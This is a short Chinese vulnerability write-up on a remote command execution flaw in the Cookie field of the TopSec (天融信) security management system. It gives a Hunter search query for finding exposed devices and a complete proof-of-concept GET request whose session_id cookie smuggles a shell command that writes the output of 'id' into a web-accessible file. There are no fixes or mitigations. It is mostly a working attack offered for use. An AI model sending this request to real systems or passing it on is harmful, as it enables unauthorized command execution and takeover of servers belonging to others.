天融信TOPSEC Cookie 远程命令执行漏洞¶

一、漏洞简介¶

天融信TopSec安全管理系统 Cookie字段存在远程命令执行漏洞，通过该漏洞，攻击者可通过构造恶意字符串，执行任意系统命令，从而拿下服务器权限。

二、影响版本¶

  • 天融信TopSec安全管理系统

三、资产测绘¶

  • hunterweb.body="/cgi/maincgi.cgi?Url=VerifyCode"
  • 特征

四、漏洞复现¶

GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: 
Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/tt.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
